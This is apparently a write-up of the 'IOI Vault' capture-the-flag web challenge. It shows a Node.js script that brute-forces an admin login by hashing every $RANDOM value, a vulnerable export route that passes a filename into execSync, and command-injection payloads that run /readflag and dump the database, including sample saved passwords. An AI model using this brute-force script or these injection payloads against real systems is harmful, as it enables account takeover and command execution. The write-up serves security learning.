## IOI Vault
```
Aech discovered that Nolan Sorrento uses an I0I password manager to store his Oasis rig password. Can you help Parzival and Aech extract Sorrento's Oasis rig password?
Nolan Sorrento in Ready Player One
Does Nolan Sorrento own IOI?
Sorrento is the head of Innovative Online Industries, also known as IOI, the world's largest ISP.
Wade’s wireless VR headset. “Ready Player One” doesn’t waste a whole lot of time explaining how gadgets used in the film work, but Wade’s headset, which is also used by most other characters, essentially looks like a pair of fancy ski goggles. Light, wireless, and apparently working without any external hardware, it is capable of transporting you to the virtual world of the Oasis where ever you are
Aech (pronounced as the letter 'H') is a main character in Ernest Cline's Ready Player One. Aech has been Wade's best friend for years
Wade Owen Watts, under the virtual name Parzival, is the main protagonist of Erenest Cline's novel and Steven Spielberg's movie Ready Player One. 
Also in Fallout 3 The Vault 101 entrance password is "Amata". 
```
But absolutely none of that is relevant to the challenge, so, feel free to not read it :D

Looking at the source all user passwords were generated with a funny bash oneliner:
```bash
function genPass() {
    echo -n $RANDOM | md5sum | head -c 32
}
```

Of course $RANDOM deoesn't have enough entropy to be safe to use as a password.
```bash
while true;do echo $RANDOM;done
```

So we just have to bruteforce IDOR that, I did it in node for learning sake, but you could do that with the language of your choice

```js
const fetch = require('node-fetch');
const crypto = require('crypto');


async function login() {

  for (let i = 0; i < 32767; i++) {

    const user = 'admin';
    //const hash = 'c8443b6213aa517f2d701ebf845fdae4';
    //const pass = '29073';
    const pass = i.toString();
    const hash = crypto.createHash('md5').update(pass).digest('hex');

    const query = `
      mutation($username: String!, $password: String!) {
        LoginUser(username: $username, password: $password) {
          message,
          token
        }
      }
    `;

    const variables = {
      'username': user,
      'password': hash
    };

    const endpoint = "http://64.227.37.161:32741/graphql";

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query, variables })
    });

    const res = await response.json();
    const jsonString = JSON.stringify(res);
    console.log(pass + ' - ' + hash);

    if (jsonString.includes('User logged in successfully!')) {
      console.log(res);
      process.exit(0);
    }
  }
}

login();
```

```bash
node brute.js
...
SNIP
...
1551 - 4e6cd95227cb0c280e99a195be5f6615
1552 - 351b33587c5fdd93bd42ef7ac9995a28
1553 - 18ead4c77c3f40dabf9735432ac9d97a
1554 - 98986c005e5def2da341b4e0627d4712
{
  data: {
    LoginUser: {
      message: 'User logged in successfully!',
      token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY4MjQ4ODU2OH0.XJ4DiaIw2GzNnR3DWssvT7y06ziq0aWuKi-keJcPUaw'
    }
  }
}
```

So now we can login as admin with that token, and admin has access to an additionnal feature in the webapp, to dump the db, how convenient
```
router.get('/admin/export', AuthMiddleware, async (req, res, next) => {
    if (!req.user.is_admin) return res.redirect('/dashboard');

    const { filename } = req.query;

    if (filename) {
        try {
            execSync(`mysqldump -h 127.0.0.1 -uioi_vault -pioi_vault --add-drop-table ioi_vault > /opt/exports/${filename}.sql`);

            if (existsSync(`/opt/exports/${filename}.sql`)) {
                return res.download(`/opt/exports/${filename}.sql`, `${filename}.sql`);
            }
        }
        catch (e) {
            return res.status(500).send(response('Something went wrong!'));
        }
    }
```

And it's pretty obviously vulnerable to command injection, so
```
GET /admin/export?filename=ioivault_dump;sleep 5; HTTP/1.1
```

pop pop
```
GET /admin/export?filename=ioivault_dump;mysql -h 127.0.0.1 -uioi_vault -pioi_vault -Dioi_vault -e "update saved_passwords set note='$(/readflag)' where owner='admin';"; HTTP/1.1
```

And we just have to use our database dumping as a service (DDaS) for the exfiltration
```
GET /admin/export?filename=ioivault_dump HTTP/1.1
```

And it's looting time
```sql
--
-- Dumping data for table `saved_passwords`
--

LOCK TABLES `saved_passwords` WRITE;
/*!40000 ALTER TABLE `saved_passwords` DISABLE KEYS */;
INSERT INTO `saved_passwords` VALUES (1,'admin','Web','ioivault.htb','admin','admin123','HTB{1d0r5_4r3_3v3rywh3r3!!!}'),(2,'louisbarnett','Web','spotify.com','louisbarnett','YMgC41@)pT+BV','student sub'),(3,'louisbarnett','Email','dmail.com','louisbarnett@dmail.com','L-~I6pOy42MYY#y','private mail'),(4,'ninaviola','Web','office365.com','ninaviola1','OfficeSpace##1','company email'),(5,'alvinfisher','App','Netflix','alvinfisher1979','efQKL2pJAWDM46L7','Family Netflix'),(6,'alvinfisher','Web','twitter.com','alvinfisher1979','7wYz9pbbaH3S64LG','old twitter account');
/*!40000 ALTER TABLE `saved_passwords` ENABLE KEYS */;
UNLOCK TABLES;
```
